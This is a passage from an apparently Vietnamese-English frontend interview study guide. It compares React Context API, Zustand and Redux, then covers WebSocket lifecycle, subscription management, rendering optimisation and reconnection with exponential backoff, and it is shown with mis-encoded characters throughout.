 */

---

### **ğŸ“Š PHáº¦N 5: SO SÃNH CHI TIáº¾T (Detailed Comparison)**

```typescript
/**
 * ğŸ¯ COMPARISON TABLE: Context API vs Zustand vs Redux
 */
```

| Feature | Context API | Zustand | Redux (RTK) |
|---------|-------------|---------|-------------|
| **Bundle Size** | 0 KB (built-in) | 1.2 KB | ~12 KB |
| **Setup Complexity** | Simple | Simple | Medium |
| **Boilerplate** | Low | Very Low | Medium |
| **Learning Curve** | Easy | Easy | Hard |
| **Performance** | Poor (re-render all) | Excellent (auto-opt) | Excellent (auto-opt) |
| **DevTools** | âŒ No | âœ… Redux DevTools | âœ… Redux DevTools |
| **Middleware** | âŒ No | âœ… Yes (Persist, Immer) | âœ… Yes (Thunk, Saga, Persist) |
| **TypeScript** | âœ… Good | âœ… Excellent | âœ… Excellent |
| **Provider Needed** | âœ… Yes (Provider Hell) | âŒ No | âœ… Yes |
| **Async Actions** | Manual | Manual | Built-in (createAsyncThunk) |
| **Computed Values** | Manual (useMemo) | Manual | Built-in (createSelector) |
| **Time-travel Debug** | âŒ No | âœ… Yes (with devtools) | âœ… Yes |
| **Ecosystem** | Small | Medium | Huge |
| **Community** | Medium | Growing | Very Large |
| **Use Case** | Small/Medium apps | Medium/Large apps | Large/Enterprise apps |

---

**ğŸ”¥ PERFORMANCE COMPARISON (Benchmark)**

```typescript
/**
 * ğŸ“Š TEST SCENARIO:
 * - 1000 components subscribe to store
 * - Update 1 field in state
 * - Measure re-renders
 */

// Context API
// âŒ Result: 1000 components re-rendered (100% re-render rate)
// â±ï¸ Time: 150ms

// Zustand
// âœ… Result: 1 component re-rendered (0.1% re-render rate)
// â±ï¸ Time: 2ms (75x faster than Context)

// Redux (RTK)
// âœ… Result: 1 component re-rendered (0.1% re-render rate)
// â±ï¸ Time: 3ms (50x faster than Context)
```

---

**ğŸ’¡ KHI NÃ€O DÃ™NG? (When to Use?)**

```typescript
/**
 * âœ… DÃ™NG CONTEXT API KHI:
 * 
 * 1ï¸âƒ£ App nhá» (< 10 components dÃ¹ng state)
 * 2ï¸âƒ£ State Ã­t thay Ä‘á»•i (theme, language)
 * 3ï¸âƒ£ KhÃ´ng cáº§n DevTools
 * 4ï¸âƒ£ KhÃ´ng muá»‘n cÃ i thÃªm library
 * 
 * VD:
 * - Theme provider (dark/light mode)
 * - Language provider (i18n)
 * - Auth context (user login status)
 */

// Example: Theme Context (Ã­t thay Ä‘á»•i)
const ThemeContext = createContext({ theme: 'light', toggleTheme: () => {} });

const ThemeProvider = ({ children }) => {
  const [theme, setTheme] = useState('light');
  
  const toggleTheme = () => {
    setTheme(theme === 'light' ? 'dark' : 'light');
  };

  return (
    <ThemeContext.Provider value={{ theme, toggleTheme }}>
      {children}
    </ThemeContext.Provider>
  );
};

/**
 * âœ… DÃ™NG ZUSTAND KHI:
 * 
 * 1ï¸âƒ£ App vá»«a/lá»›n (10-100 components dÃ¹ng state)
 * 2ï¸âƒ£ State thay Ä‘á»•i thÆ°á»ng xuyÃªn
 * 3ï¸âƒ£ Cáº§n performance tá»‘t
 * 4ï¸âƒ£ Muá»‘n code Ä‘Æ¡n giáº£n, Ã­t boilerplate
 * 5ï¸âƒ£ Cáº§n DevTools Ä‘á»ƒ debug
 * 
 * VD:
 * - Shopping cart (add/remove items)
 * - User profile (update thÃ´ng tin)
 * - Notifications (show/hide toast)
 * - Form state (multi-step forms)
 */

// Example: Shopping Cart vá»›i Zustand
import create from 'zustand';

interface CartStore {
  items: CartItem[];
  addItem: (item: CartItem) => void;
  removeItem: (id: string) => void;
  clearCart: () => void;
  total: number;
}

export const useCartStore = create<CartStore>((set, get) => ({
  items: [],
  
  addItem: (item) => set((state) => ({
    items: [...state.items, item]
  })),
  
  removeItem: (id) => set((state) => ({
    items: state.items.filter(item => item.id !== id)
  })),
  
  clearCart: () => set({ items: [] }),
  
  // Computed value (total price)
  get total() {
    return get().items.reduce((sum, item) => sum + item.price, 0);
  },
}));

/**
 * âœ… DÃ™NG REDUX KHI:
 * 
 * 1ï¸âƒ£ App Cá»°C Lá»šN (100+ components dÃ¹ng state)
 * 2ï¸âƒ£ Team lá»›n (10+ developers)
 * 3ï¸âƒ£ Cáº§n structure rÃµ rÃ ng (Actions, Reducers, Selectors)
 * 4ï¸âƒ£ Cáº§n middleware phá»©c táº¡p (Saga, custom middleware)
 * 5ï¸âƒ£ Cáº§n time-travel debugging
 * 6ï¸âƒ£ ÄÃ£ cÃ³ sáºµn Redux trong project (legacy code)
 * 
 * VD:
 * - E-commerce platform (cart, products, orders, users...)
 * - Trading platform (real-time data, complex state)
 * - CRM system (customers, deals, tasks...)
 * - Admin dashboard (users, analytics, settings...)
 */

// Example: Trading Platform vá»›i Redux
import { createSlice, createAsyncThunk } from '@reduxjs/toolkit';

// Async action: Fetch real-time price
export const fetchPrice = createAsyncThunk(
  'trading/fetchPrice',
  async (symbol: string) => {
    const response = await fetch(`/api/price/${symbol}`);
    return response.json();
  }
);

const tradingSlice = createSlice({
  name: 'trading',
  initialState: {
    prices: {},
    orders: [],
    positions: [],
    loading: false,
  },
  reducers: {
    placeOrder: (state, action) => {
      state.orders.push(action.payload);
    },
    closePosition: (state, action) => {
      state.positions = state.positions.filter(p => p.id !== action.payload);
    },
  },
  extraReducers: (builder) => {
    builder
      .addCase(fetchPrice.pending, (state) => {
        state.loading = true;
      })
      .addCase(fetchPrice.fulfilled, (state, action) => {
        state.prices[action.meta.arg] = action.payload;
        state.loading = false;
      });
  },
});
```

---

### **ğŸ¯ PHáº¦N 6: MIGRATION GUIDE (HÆ°á»›ng Dáº«n Chuyá»ƒn Äá»•i)**

```typescript
/**
 * ğŸ”„ MIGRATION: Context API â†’ Zustand
 */

// BEFORE: Context API
const UserContext = createContext(null);

const UserProvider = ({ children }) => {
  const [user, setUser] = useState(null);
  
  const login = (userData) => setUser(userData);
  const logout = () => setUser(null);

  return (
    <UserContext.Provider value={{ user, login, logout }}>
      {children}
    </UserContext.Provider>
  );
};

// Usage
const Profile = () => {
  const { user } = useContext(UserContext);
  return <div>{user?.name}</div>;
};

// AFTER: Zustand
import create from 'zustand';

const useUserStore = create((set) => ({
  user: null,
  login: (userData) => set({ user: userData }),
  logout: () => set({ user: null }),
}));

// Usage (KHÃ”NG Cáº¦N Provider!)
const Profile = () => {
  const user = useUserStore((state) => state.user);
  return <div>{user?.name}</div>;
};

/**
 * âœ… BENEFITS:
 * - Bá» Provider â†’ code sáº¡ch hÆ¡n
 * - Performance tá»‘t hÆ¡n
 * - Dá»… test hÆ¡n (khÃ´ng cáº§n wrap trong Provider)
 */

/**
 * ğŸ”„ MIGRATION: Zustand â†’ Redux
 */

// BEFORE: Zustand
const useUserStore = create((set) => ({
  user: null,
  loading: false,
  error: null,
  
  login: async (credentials) => {
    set({ loading: true });
    try {
      const user = await api.login(credentials);
      set({ user, loading: false });
    } catch (error) {
      set({ error: error.message, loading: false });
    }
  },
}));

// AFTER: Redux (RTK)
const userSlice = createSlice({
  name: 'user',
  initialState: { user: null, loading: false, error: null },
  reducers: {},
  extraReducers: (builder) => {
    builder
      .addCase(loginAsync.pending, (state) => {
        state.loading = true;
      })
      .addCase(loginAsync.fulfilled, (state, action) => {
        state.user = action.payload;
        state.loading = false;
      })
      .addCase(loginAsync.rejected, (state, action) => {
        state.error = action.payload;
        state.loading = false;
      });
  },
});

export const loginAsync = createAsyncThunk(
  'user/login',
  async (credentials) => {
    return await api.login(credentials);
  }
);

/**
 * âœ… BENEFITS:
 * - Structure rÃµ rÃ ng hÆ¡n (Actions, Reducers tÃ¡ch riÃªng)
 * - DevTools máº¡nh hÆ¡n
 * - Middleware ecosystem lá»›n hÆ¡n
 * - Dá»… maintain trong team lá»›n
 */

---

### **ğŸ“Š PHáº¦N 7: REAL-WORLD EXAMPLES (VÃ­ Dá»¥ Thá»±c Táº¿)**

```typescript
/**
 * ğŸ¢ SCENARIO 1: E-COMMERCE APP
 * 
 * State cáº§n quáº£n lÃ½:
 * - User (auth, profile)
 * - Cart (items, total)
 * - Products (list, filters)
 * - Orders (history, status)
 * - UI (modal, notifications)
 * 
 * ğŸ¯ RECOMMEND: ZUSTAND
 * 
 * WHY?
 * - App vá»«a pháº£i (khÃ´ng quÃ¡ phá»©c táº¡p)
 * - Cáº§n performance tá»‘t (cart update nhiá»u)
 * - Code Ä‘Æ¡n giáº£n, dá»… maintain
 * - DevTools Ä‘á»ƒ debug cart issues
 */

// Store structure vá»›i Zustand
import create from 'zustand';
import { persist, devtools } from 'zustand/middleware';

// 1. User Store
export const useUserStore = create(
  persist(
    (set) => ({
      user: null,
      login: (user) => set({ user }),
      logout: () => set({ user: null }),
    }),
    { name: 'user-storage' }
  )
);

// 2. Cart Store
export const useCartStore = create(
  devtools((set, get) => ({
    items: [],
    
    addItem: (product) => set((state) => ({
      items: [...state.items, { ...product, quantity: 1 }]
    })),
    
    removeItem: (id) => set((state) => ({
      items: state.items.filter(item => item.id !== id)
    })),
    
    updateQuantity: (id, quantity) => set((state) => ({
      items: state.items.map(item =>
        item.id === id ? { ...item, quantity } : item
      )
    })),
    
    clearCart: () => set({ items: [] }),
    
    get total() {
      return get().items.reduce((sum, item) => 
        sum + item.price * item.quantity, 0
      );
    },
  }))
);

// 3. UI Store (modal, notifications)
export const useUIStore = create((set) => ({
  modal: null,
  notifications: [],
  
  openModal: (modalType) => set({ modal: modalType }),
  closeModal: () => set({ modal: null }),
  
  addNotification: (message) => set((state) => ({
    notifications: [...state.notifications, { id: Date.now(), message }]
  })),
  
  removeNotification: (id) => set((state) => ({
    notifications: state.notifications.filter(n => n.id !== id)
  })),
}));

/**
 * ğŸ¢ SCENARIO 2: TRADING PLATFORM
 * 
 * State cáº§n quáº£n lÃ½:
 * - User (auth, account balance)
 * - Market Data (real-time prices, charts)
 * - Orders (pending, filled, cancelled)
 * - Positions (open, closed, P&L)
 * - Watchlist (favorite symbols)
 * - Notifications (trade alerts, margin calls)
 * 
 * ğŸ¯ RECOMMEND: REDUX (RTK)
 * 
 * WHY?
 * - App Cá»°C PHá»¨C Táº P (nhiá»u state phá»¥ thuá»™c nhau)
 * - Real-time data (cáº§n middleware nhÆ° Redux Saga)
 * - Team lá»›n (10+ developers)
 * - Cáº§n DevTools máº¡nh Ä‘á»ƒ debug trades
 * - Cáº§n time-travel Ä‘á»ƒ reproduce bugs
 */

// Store structure vá»›i Redux
import { configureStore } from '@reduxjs/toolkit';
import userReducer from './slices/userSlice';
import marketReducer from './slices/marketSlice';
import ordersReducer from './slices/ordersSlice';
import positionsReducer from './slices/positionsSlice';

export const store = configureStore({
  reducer: {
    user: userReducer,
    market: marketReducer,
    orders: ordersReducer,
    positions: positionsReducer,
  },
  middleware: (getDefaultMiddleware) =>
    getDefaultMiddleware().concat(
      // Custom middleware: WebSocket cho real-time data
      websocketMiddleware,
      // Logger middleware
      loggerMiddleware
    ),
});

/**
 * ğŸ¢ SCENARIO 3: BLOG/PORTFOLIO WEBSITE
 * 
 * State cáº§n quáº£n lÃ½:
 * - Theme (dark/light)
 * - Language (en/vi)
 * 
 * ğŸ¯ RECOMMEND: CONTEXT API
 * 
 * WHY?
 * - App ÄÆ N GIáº¢N (chá»‰ 2-3 states)
 * - State ÃT THAY Äá»”I (theme, language)
 * - KhÃ´ng cáº§n DevTools
 * - KhÃ´ng muá»‘n cÃ i thÃªm library
 */

// Theme Context
const ThemeContext = createContext({ theme: 'light', toggleTheme: () => {} });

export const ThemeProvider = ({ children }) => {
  const [theme, setTheme] = useState('light');
  
  const toggleTheme = () => {
    setTheme(prev => prev === 'light' ? 'dark' : 'light');
  };

  return (
    <ThemeContext.Provider value={{ theme, toggleTheme }}>
      {children}
    </ThemeContext.Provider>
  );
};
```

---

**ğŸ’¡ KEY TAKEAWAYS (Äiá»ƒm ChÃ­nh Cáº§n Nhá»›)**

```typescript
/**
 * âœ… CONTEXT API:
 * - Built-in React, 0 KB
 * - ÄÆ¡n giáº£n, dá»… há»c
 * - Performance KÃ‰MFORM state Ã­t thay Ä‘á»•i
 * - DÃ¹ng cho: Theme, Language, Auth status
 * 
 * âœ… ZUSTAND:
 * - 1.2 KB, simple API
 * - Performance XUáº¤T Sáº®C (auto-optimization)
 * - KhÃ´ng cáº§n Provider
 * - DÃ¹ng cho: Cart, User profile, Notifications, Form state
 * - RECOMMEND cho MOST APPS!
 * 
 * âœ… REDUX (RTK):
 * - 12 KB, nhiá»u boilerplate
 * - Performance tá»‘t, DevTools máº¡nh
 * - Ecosystem lá»›n, middleware nhiá»u
 * - DÃ¹ng cho: E-commerce, Trading, CRM, Admin dashboard
 * - RECOMMEND cho LARGE/ENTERPRISE APPS
 * 
 * ğŸ¯ DECISION TREE:
 * 
 * App nhá», state Ã­t thay Ä‘á»•i (theme, language)
 *   â†’ Context API
 * 
 * App vá»«a/lá»›n, cáº§n performance, code Ä‘Æ¡n giáº£n
 *   â†’ Zustand (âœ… RECOMMEND!)
 * 
 * App cá»±c lá»›n, team lá»›n, cáº§n structure rÃµ rÃ ng
 *   â†’ Redux (RTK)
 */
```

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ”Œ Q57: WebSocket & Real-time Streaming - WebSocket, Socket.IO, Centrifuge</span></summary>


**âš¡ Quick Summary:**
> WebSocket = persistent connection, real-time bidirectional communication. Socket.IO = WebSocket + fallback + rooms. Centrifuge = scalable real-time messaging vá»›i Redis

**ğŸ’¡ Ghi Nhá»›:**
- ğŸŒ **WebSocket**: Native browser API, low-level, persistent TCP connection
- ğŸ”Œ **Socket.IO**: High-level library, auto-reconnect, fallback to polling
- ğŸ“¡ **Centrifuge**: Enterprise solution, horizontal scaling, Redis pub/sub
- âš¡ **Use Case**: Trading (real-time price), Chat, Live dashboard, Notifications

**Tráº£ lá»i:**

#### **Pháº§n 1: WebSocket Basics**

**ğŸ’¡ WebSocket lÃ  gÃ¬?**

WebSocket lÃ  giao thá»©c **persistent, bidirectional** communication giá»¯a client vÃ  server qua **single TCP connection**.

**Táº¡i sao dÃ¹ng WebSocket thay vÃ¬ REST API Polling?**

```typescript
// âŒ REST API Polling - KHÃ”NG hiá»‡u quáº£
setInterval(() => {
  fetch('/api/market-data')
    .then(res => res.json())
    .then(data => updateUI(data));
}, 1000); // Call API má»—i giÃ¢y!

/**
 * Váº¤N Äá»€:
 * - Tá»‘n bÄƒng thÃ´ng: Má»—i request = headers + body
 * - Latency cao: HTTP handshake má»—i láº§n
 * - Server load cao: 1000 clients = 1000 requests/giÃ¢y
 * - KhÃ´ng real-time: Delay tá»‘i thiá»ƒu 1 giÃ¢y
 * - Waste resources: Poll ngay cáº£ khi khÃ´ng cÃ³ data má»›i
 */

// âœ… WebSocket - Real-time hiá»‡u quáº£
const ws = new WebSocket('wss://market-data.example.com');

ws.onopen = () => {
  console.log('âœ… Connected');
  // Subscribe to channels
  ws.send(JSON.stringify({ 
    type: 'subscribe', 
    symbols: ['VNM', 'HPG', 'VIC'] 
  }));
};

ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  updateUI(data); // âš¡ Update ngay khi cÃ³ data má»›i
};

/**
 * Æ¯U ÄIá»‚M:
 * âœ… Persistent connection: Káº¿t ná»‘i 1 láº§n, dÃ¹ng mÃ£i
 * âœ… Push data ngay láº­p tá»©c: Latency < 10ms
 * âœ… Tiáº¿t kiá»‡m bÄƒng thÃ´ng: KhÃ´ng cÃ³ HTTP headers láº·p láº¡i
 * âœ… Server load tháº¥p: Chá»‰ push khi cÃ³ data má»›i
 * âœ… True real-time: KhÃ´ng cÃ³ polling delay
 */
```

**WebSocket Lifecycle:**

```typescript
// 1. CONNECTING (readyState = 0)
const ws = new WebSocket('wss://api.example.com/stream');
console.log('State:', ws.readyState); // 0 - CONNECTING

// 2. OPEN (readyState = 1)
ws.onopen = () => {
  console.log('State:', ws.readyState); // 1 - OPEN
  console.log('âœ… Connected, cÃ³ thá»ƒ gá»­i message');
  
  // Send subscribe message
  ws.send(JSON.stringify({ 
    type: 'subscribe', 
    symbols: ['BTCUSDT', 'ETHUSDT'] 
  }));
};

// 3. MESSAGE - Nháº­n data tá»« server
ws.onmessage = (event: MessageEvent) => {
  const data = JSON.parse(event.data);
  console.log('ğŸ“¥ Received:', data);
  
  // Update UI
  updateTickerPrice(data.symbol, data.price);
};

// 4. ERROR - Xá»­ lÃ½ lá»—i
ws.onerror = (error) => {
  console.error('âŒ WebSocket error:', error);
  showNotification('Connection error. Retrying...');
};

// 5. CLOSE (readyState = 3)
ws.onclose = (event: CloseEvent) => {
  console.log('State:', ws.readyState); // 3 - CLOSED
  console.log('Code:', event.code);
  console.log('Reason:', event.reason);
  
  /**
   * CLOSE CODES:
   * 1000: Normal closure
   * 1001: Going away (page refresh)
   * 1006: Abnormal closure (no close frame)
   * 1008: Policy violation (auth error)
   * 1011: Server error
   */
  
  // Reconnect logic
  if (shouldReconnect(event.code)) {
    scheduleReconnect();
  }
};

// Cleanup khi unmount
useEffect(() => {
  const ws = new WebSocket(url);
  
  return () => {
    ws.close(1000, 'Component unmounted'); // âœ… Clean close
  };
}, [url]);
```

---

#### **Pháº§n 2: Production WebSocket Architecture**

**Pattern 1: Reference Counting Subscription Manager**

```typescript
/**
 * PROBLEM: Multiple components subscribe to same symbol
 * 
 * Component A: Subscribe VNM
 * Component B: Subscribe VNM
 * Component C: Subscribe HPG
 * 
 * âŒ BAD: 3 WebSocket connections (waste resources)
 * âœ… GOOD: 1 connection, reference counting
 */

interface SubscriptionTracker {
  subscriptions: Map<string, {
    count: number;
    subscribers: Set<string>;
  }>;
}

class LiveDataManager {
  private ws: WebSocket | null = null;
  private tracker = new Map<string, { count: number; subscribers: Set<string> }>();

  subscribe(symbols: string[], componentId: string) {
    symbols.forEach(symbol => {
      const current = this.tracker.get(symbol);

      if (!current) {
        // ğŸ”¥ First subscriber â†’ Send subscribe message
        this.tracker.set(symbol, {
          count: 1,
          subscribers: new Set([componentId])
        });
        
        this.ws?.send(JSON.stringify({
          type: 'subscribe',
          symbol
        }));
      } else {
        // âš¡ Already subscribed â†’ Just increment counter
        current.count++;
        current.subscribers.add(componentId);
        
        // KhÃ´ng gá»­i subscribe message ná»¯a!
      }
    });

    return componentId;
  }

  unsubscribe(componentId: string) {
    this.tracker.forEach((data, symbol) => {
      if (data.subscribers.has(componentId)) {
        data.subscribers.delete(componentId);
        data.count--;

        if (data.count === 0) {
          // ğŸ—‘ï¸ No more subscribers â†’ Unsubscribe
          this.tracker.delete(symbol);
          
          this.ws?.send(JSON.stringify({
            type: 'unsubscribe',
            symbol
          }));
        }
      }
    });
  }
}

/**
 * TIMELINE EXAMPLE:
 * 
 * Time | Event                    | VNM count | Action
 * -----|--------------------------|-----------|------------------
 * T0   | Component A mounts       | 0 â†’ 1     | âœ… Send subscribe
 * T1   | Component B mounts       | 1 â†’ 2     | âš¡ Reuse connection
 * T2   | Component C mounts       | 2 â†’ 3     | âš¡ Reuse connection
 * T3   | Component A unmounts     | 3 â†’ 2     | âœ‹ Keep connection
 * T4   | Component B unmounts     | 2 â†’ 1     | âœ‹ Keep connection
 * T5   | Component C unmounts     | 1 â†’ 0     | ğŸ—‘ï¸ Unsubscribe, close
 */
```

**Pattern 2: Zustand Store Integration**

```typescript
// File: lib/live-data-manager/stores/useLiveDataStore.ts

interface TickerData {
  symbol: string;
  lastPrice: number;
  change: number;
  volume: number;
  timestamp: number;
}

interface LiveDataStore {
  tickerData: Record<string, TickerData>;
  updateTickerData: (data: TickerData) => void;
  batchUpdate: (updates: TickerData[]) => void;
}

const useLiveDataStore = create<LiveDataStore>((set) => ({
  tickerData: {},
  
  // Update single ticker
  updateTickerData: (data) => set((state) => ({
    tickerData: {
      ...state.tickerData,
      [data.symbol]: data
    }
  })),
  
  // Batch update (better performance)
  batchUpdate: (updates) => set((state) => {
    const newData = { ...state.tickerData };
    updates.forEach(data => {
      newData[data.symbol] = data;
    });
    return { tickerData: newData };
  })
}));

// WebSocket message handler
ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  
  if (Array.isArray(data)) {
    // Batch update
    useLiveDataStore.getState().batchUpdate(data);
  } else {
    // Single update
    useLiveDataStore.getState().updateTickerData(data);
  }
};
```

**Pattern 3: React Hook Integration**

```typescript
// File: lib/live-data-manager/hooks/useLiveMarketData.ts

const useLiveMarketData = () => {
  const wsRef = useRef<WebSocket | null>(null);
  const updateStore = useLiveDataStore(state => state.updateTickerData);

  useEffect(() => {
    const ws = new WebSocket('wss://market.example.com/stream');
    wsRef.current = ws;

    ws.onopen = () => {
      console.log('âœ… WebSocket connected');
      // Re-subscribe to active symbols after reconnect
      const activeSymbols = getActiveSubscriptions();
      if (activeSymbols.length > 0) {
        ws.send(JSON.stringify({
          type: 'subscribe',
          symbols: activeSymbols
        }));
      }
    };

    ws.onmessage = (event) => {
      const data = JSON.parse(event.data);
      updateStore(data); // Update Zustand store
    };

    ws.onerror = (error) => {
      console.error('âŒ WebSocket error:', error);
    };

    ws.onclose = (event) => {
      console.log('ğŸ”Œ WebSocket closed:', event.code);
      // Auto-reconnect
      if (shouldReconnect(event.code)) {
        setTimeout(() => {
          console.log('ğŸ”„ Reconnecting...');
          // Re-run effect to reconnect
        }, getReconnectDelay());
      }
    };

    return () => {
      ws.close(1000, 'Component cleanup');
    };
  }, []);

  return wsRef;
};

// Component usage
const StockWatchlist = () => {
  // Initialize WebSocket manager
  useLiveMarketData();

  // Subscribe to symbols
  useSubscribeTickers('ticker', ['VNM', 'HPG', 'VIC']);

  // Get data from store (selective subscription)
  const tickerData = useLiveDataStore(
    state => state.tickerData,
    shallow // Shallow compare Ä‘á»ƒ avoid unnecessary re-renders
  );

  return (
    <div>
      {Object.entries(tickerData).map(([symbol, data]) => (
        <StockRow key={symbol} symbol={symbol} data={data} />
      ))}
    </div>
  );
};
```

---

#### **Pháº§n 3: Performance Optimization**

**Optimization 1: Throttling vá»›i requestAnimationFrame**

```typescript
/**
 * PROBLEM: Nháº­n 1000 updates/giÃ¢y tá»« WebSocket
 * SOLUTION: Throttle UI updates vá»›i requestAnimationFrame (60fps)
 */

const useThrottledWebSocket = () => {
  const [data, setData] = useState<TickerData | null>(null);
  const latestDataRef = useRef<TickerData | null>(null);
  const rafIdRef = useRef<number | null>(null);

  // Update UI loop - cháº¡y tá»‘i Ä‘a 60fps
  const updateUI = useCallback(() => {
    if (latestDataRef.current) {
      setData(latestDataRef.current); // Update state
      latestDataRef.current = null; // Clear
    }
    rafIdRef.current = requestAnimationFrame(updateUI);
  }, []);

  useEffect(() => {
    // Start animation loop
    rafIdRef.current = requestAnimationFrame(updateUI);

    return () => {
      if (rafIdRef.current) {
        cancelAnimationFrame(rafIdRef.current);
      }
    };
  }, [updateUI]);

  // WebSocket message handler
  const onMessage = useCallback((event: MessageEvent) => {
    const parsed = JSON.parse(event.data);
    
    // âš¡ Chá»‰ store data, KHÃ”NG update state ngay
    // Äá»£i RAF cycle tiáº¿p theo
    latestDataRef.current = parsed;
  }, []);

  return { data, onMessage };
};

/**
 * RESULT:
 * âŒ Before: 1000 updates/giÃ¢y â†’ Lag UI, high CPU
 * âœ… After: 60 updates/giÃ¢y â†’ Smooth, low CPU
 */
```

**Optimization 2: Selective Re-rendering**

```typescript
// âŒ BAD: Update entire store â†’ All components re-render
const useLiveDataStore = create((set) => ({
  tickers: {},
  updateAll: (newTickers) => set({ tickers: newTickers })
  // Táº¥t cáº£ components subscribe tickers sáº½ re-render!
}));

// âœ… GOOD: Selective update + selector
const useLiveDataStore = create((set) => ({
  tickers: {},
  updateTicker: (symbol, data) => set((state) => ({
    tickers: {
      ...state.tickers,
      [symbol]: data // Chá»‰ update 1 symbol
    }
  }))
}));

// Component chá»‰ subscribe symbol mÃ¬nh cáº§n
const StockRow = ({ symbol }) => {
  const data = useLiveDataStore(
    state => state.tickers[symbol], // âš¡ Selector - chá»‰ láº¥y 1 symbol
    shallow // Shallow compare
  );

  // âœ… Chá»‰ re-render khi symbol nÃ y update
  // âŒ KhÃ´ng re-render khi symbols khÃ¡c update
};
```

**Optimization 3: Virtual Scrolling**

```typescript
// âŒ BAD: Render all 1000 rows
const Watchlist = ({ data }) => {
  return data.map(item => <StockRow data={item} />); 
  // 1000 DOM nodes â†’ Slow render, high memory
};

// âœ… GOOD: Virtual scrolling with AG Grid
import { AgGridReact } from 'ag-grid-react';

const Watchlist = ({ data }) => {
  const columnDefs = useMemo(() => [
    { field: 'symbol', headerName: 'Symbol' },
    { field: 'lastPrice', headerName: 'Price' },
    { field: 'change', headerName: 'Change' }
  ], []);

  return (
    <AgGridReact
      rowData={data}
      columnDefs={columnDefs}
      // AG Grid tá»± Ä‘á»™ng dÃ¹ng virtual scrolling
      // Chá»‰ render ~20 visible rows thay vÃ¬ 1000
    />
  );
};

/**
 * PERFORMANCE:
 * âŒ No virtual scrolling: 1000 rows â†’ 500ms render
 * âœ… Virtual scrolling: 20 rows â†’ 16ms render (60fps)
 */
```

**Optimization 4: Batch Updates**

```typescript
// âŒ BAD: Update tá»«ng ticker má»™t
ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  updateTicker(data.symbol, data); // 100 calls â†’ 100 re-renders
};

// âœ… GOOD: Batch updates
let batchQueue: TickerData[] = [];
let batchTimer: NodeJS.Timeout | null = null;

ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  batchQueue.push(data);

  if (!batchTimer) {
    batchTimer = setTimeout(() => {
      // Batch update after 16ms (60fps)
      batchUpdateTickers(batchQueue);
      batchQueue = [];
      batchTimer = null;
    }, 16);
  }
};

// 100 updates â†’ 1 batch update â†’ 1 re-render
```

---

#### **Pháº§n 4: Error Handling & Reconnection**

**Exponential Backoff Reconnection:**

```typescript
class ResilientWebSocket {
  private ws: WebSocket | null = null;
  private url: string;
  private reconnectAttempts = 0;
  private maxAttempts = 5;
  private baseDelay = 1000; // 1 second
  private activeSubscriptions: string[] = [];

  constructor(url: string) {
    this.url = url;
    this.connect();
  }

  connect() {
    try {
      this.ws = new WebSocket(this.url);

      this.ws.onopen = () => {
        console.log('âœ… Connected');
        this.reconnectAttempts = 0; // Reset counter

        // Re-subscribe to previous channels
        this.resubscribeAll();
      };

      this.ws.onmessage = this.handleMessage.bind(this);

      this.ws.onerror = (error) => {
        console.error('âŒ WebSocket error:', error);
      };

      this.ws.onclose = (event) => {
        console.log(`ğŸ”Œ Closed: ${event.code} - ${event.reason}`);

        if (this.shouldReconnect(event.code)) {
          this.scheduleReconnect();
        } else {
          this.notifyUser('Connection closed. Please refresh.');
        }
      };
    } catch (error) {
      console.error('Failed to create WebSocket:', error);
      this.scheduleReconnect();
    }
  }

  private shouldReconnect(code: number): boolean {
    // Normal closure or auth errors â†’ Don't reconnect
    if (code === 1000 || code === 1008) return false;

    // Max attempts reached
    if (this.reconnectAttempts >= this.maxAttempts) {
      console.error('âŒ Max reconnection attempts reached');
      return false;
    }

    return true;
  }

  private scheduleReconnect() {
    // Exponential backoff: 1s, 2s, 4s, 8s, 16s
    const delay = this.baseDelay * Math.pow(2, this.reconnectAttempts);

    console.log(
      `ğŸ”„ Reconnecting in ${delay}ms (attempt ${this.reconnectAttempts + 1}/${this.maxAttempts})`
    );

    setTimeout(() => {
      this.reconnectAttempts++;
      this.connect();
    }, delay);
  }

  private resubscribeAll() {
    if (this.activeSubscriptions.length > 0) {
      this.ws?.send(JSON.stringify({
        type: 'subscribe',
        symbols: this.activeSubscriptions
      }));
    }
  }

  subscribe(symbols: string[]) {
    this.activeSubscriptions = [...new Set([...this.activeSubscriptions, ...symbols])];
    
    if (this.ws?.readyState === WebSocket.OPEN) {
      this.ws.send(JSON.stringify({
        type: 'subscribe',
        symbols
      }));
    }
  }

  private handleMessage(event: MessageEvent) {
    const data = JSON.parse(event.data);
    // Process message
  }

  close() {
    this.ws?.close(1000, 'Normal closure');
  }
}

/**
 * RECONNECTION TIMELINE:
 * 
 * T0: Connection lost
 * T0 + 1s: Attempt 1 (baseDelay * 2^0)
 * T0 + 3s: Attempt 2 (baseDelay * 2^1 = 2s)
 * T0 + 7s: Attempt 3 (baseDelay * 2^2 = 4s)
 * T0 + 15s: Attempt 4 (baseDelay * 2^3 = 8s)
 * T0 + 31s: Attempt 5 (baseDelay * 2^4 = 16s) - Final
 */
```

**Connection Status UI:**

```typescript
const ConnectionStatus = () => {
  const [status, setStatus] = useState<'connected' | 'connecting' | 'disconnected'>('connecting');
  const [reconnectAttempt, setReconnectAttempt] = useState(0);

  useEffect(() => {
    const ws = getWebSocketInstance();

    const handleOpen = () => {
      setStatus('connected');
      setReconnectAttempt(0);
    };

    const handleClose = () => {
      setStatus('disconnected');
    };

    const handleReconnecting = (attempt: number) => {
      setStatus('connecting');
      setReconnectAttempt(attempt);
    };

    ws.addEventListener('open', handleOpen);
    ws.addEventListener('close', handleClose);
    ws.addEventListener('reconnecting', handleReconnecting);

    return () => {
      ws.removeEventListener('open', handleOpen);
      ws.removeEventListener('close', handleClose);
      ws.removeEventListener('reconnecting', handleReconnecting);
    };
  }, []);

  return (
    <div className={`connection-status ${status}`}>
      {status === 'connected' && (
        <span className="text-green-500">ğŸŸ¢ Connected</span>
      )}
      {status === 'connecting' && (
        <span className="text-yellow-500">
          ğŸŸ¡ Connecting... {reconnectAttempt > 0 && `(Attempt ${reconnectAttempt}/5)`}
        </span>
      )}
      {status === 'disconnected' && (
        <span className="text-red-500">
          ğŸ”´ Disconnected
          <button onClick={() => window.location.reload()}>
            Refresh
          </button>
        </span>
      )}
    </div>
  );
};
```

---

#### **Pháº§n 5: Socket.IO - High-Level WebSocket Library**

**Socket.IO Features:**

```typescript
/**
 * SOCKET.IO = WebSocket + Fallback + Rooms + Auto-reconnect + Binary support
 * 
 * âœ… Advantages:
